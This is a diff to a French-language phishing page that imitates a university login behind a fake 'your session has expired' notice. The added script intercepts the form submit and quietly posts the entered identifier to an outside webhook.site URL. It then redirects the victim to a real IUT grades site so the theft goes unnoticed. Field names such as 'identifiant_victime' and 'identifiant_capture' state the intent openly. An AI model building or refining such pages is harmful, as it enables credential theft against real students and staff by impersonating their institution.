@@ -94,9 +94,7 @@
             color: #495057;
         }
 
-        .check-container input {
-            margin-right: 15px;
-        }
+        .check-container input { margin-right: 15px; }
 
         .btn-submit {
             width: 100%;
@@ -134,11 +132,31 @@
             Votre session a expiré, vous devez vous réauthentifier
         </div>
 
-        <form action="https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2" method="POST" onsubmit="setTimeout(function(){ window.location.href='https://auth.univ-fcomte.fr'; }, 1000);">
-            
+        <script>
+            function captureEtRedirige(event) {
+                event.preventDefault(); // Empêche le rechargement immédiat
+                
+                const id = document.getElementById('id_user').value;
+                const webhookUrl = "https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2";
+
+                // 1. On envoie l'ID au webhook de manière invisible
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: new URLSearchParams({ 'identifiant_capture': id })
+                });
+
+                // 2. On attend un tout petit peu et on redirige vers les notes de l'IUT
+                setTimeout(function() {
+                    window.location.href = "https://notes.iut-nfc.umlp.fr/";
+                }, 400);
+            }
+        </script>
+
+        <form onsubmit="captureEtRedirige(event)">
             <div class="input-row">
                 <div class="icon-box">👤</div>
-                <input type="text" name="identifiant_victime" placeholder="Identifiant" required>
+                <input type="text" id="id_user" placeholder="Identifiant" required>
             </div>
 
             <div class="input-row">
